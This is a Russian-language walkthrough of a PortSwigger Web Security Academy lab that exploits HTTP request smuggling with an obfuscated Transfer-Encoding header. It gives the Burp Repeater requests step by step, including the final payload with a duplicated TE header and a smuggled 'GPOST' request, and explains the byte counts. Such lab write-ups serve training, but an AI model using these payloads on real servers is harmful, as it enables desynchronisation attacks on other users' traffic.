Перейдем на уязвимый ресурс

Перейдем на уязвимый ресурс
Откроем `Proxy` -> `HTTP history`

и отправим в Repeater запрос на корневую страницу


Сразу же перейдем на версию HTTP 1.1
и изменим метод запроса на POST 

Тем самым получив такой запрос
```
POST / HTTP/1.1
Host: 0a1f000c040f9a138374462d009b00f0.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
```
и 200 ответ

![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/25.%20HTTP%20request%20smuggling/3.%20HTTP%20request%20smuggling%2C%20obfuscating%20the%20TE%20header/pics%20for%20walkthrough/1.png)
Далее благодаря пикче давайте проверим что где работает

![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/25.%20HTTP%20request%20smuggling/3.%20HTTP%20request%20smuggling%2C%20obfuscating%20the%20TE%20header/pics%20for%20walkthrough/2.png)
```
POST / HTTP/1.1
Host: 0a1f000c040f9a138374462d009b00f0.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

3
abc
X
```
Так, это нам говорит, что там или `TE+CL` или `TE+TE`
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/25.%20HTTP%20request%20smuggling/3.%20HTTP%20request%20smuggling%2C%20obfuscating%20the%20TE%20header/pics%20for%20walkthrough/3.png)

Отлично, проведем второй запрос

```
POST / HTTP/1.1
Host: 0a1f000c040f9a138374462d009b00f0.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

X
```
Отлично, пришел 200 респонс код, что означает связку `TE+TE`
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/25.%20HTTP%20request%20smuggling/3.%20HTTP%20request%20smuggling%2C%20obfuscating%20the%20TE%20header/pics%20for%20walkthrough/4.png)

Далее найдем пикчу по обфускации TE заголовков и разных вариаций

Выберем 
```
Transfer-Encoding: chunked
Transfer-Encoding: test
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/25.%20HTTP%20request%20smuggling/3.%20HTTP%20request%20smuggling%2C%20obfuscating%20the%20TE%20header/pics%20for%20walkthrough/5.png)

Далее сконфигурируем наш пэйалоад
```
POST / HTTP/1.1
Host: 0a1f000c040f9a138374462d009b00f0.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked
Transfer-Encoding: test

5b
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 6

x=1

0
```
После выполнения которого получим уведомление об успешно выполненной лабораторной работе
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/25.%20HTTP%20request%20smuggling/3.%20HTTP%20request%20smuggling%2C%20obfuscating%20the%20TE%20header/pics%20for%20walkthrough/6.png)

Давайте теперь разберем

сначала нижний запрос
```
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 6

x=1

0
```
content `length = 6` потому что надо на 1 байт больше, чем имеется, имеется 5 и больше 5 - это 6


![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/25.%20HTTP%20request%20smuggling/3.%20HTTP%20request%20smuggling%2C%20obfuscating%20the%20TE%20header/pics%20for%20walkthrough/7.png)
```
POST / HTTP/1.1
Host: 0a1f000c040f9a138374462d009b00f0.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked
Transfer-Encoding: test

5b
```

5b стоит потому что выделенная часть равна `5b`

![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/25.%20HTTP%20request%20smuggling/3.%20HTTP%20request%20smuggling%2C%20obfuscating%20the%20TE%20header/pics%20for%20walkthrough/8.png)

Content-Length: 4 потому что `5b\r\n` это 4 байта
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/25.%20HTTP%20request%20smuggling/3.%20HTTP%20request%20smuggling%2C%20obfuscating%20the%20TE%20header/pics%20for%20walkthrough/9.png)
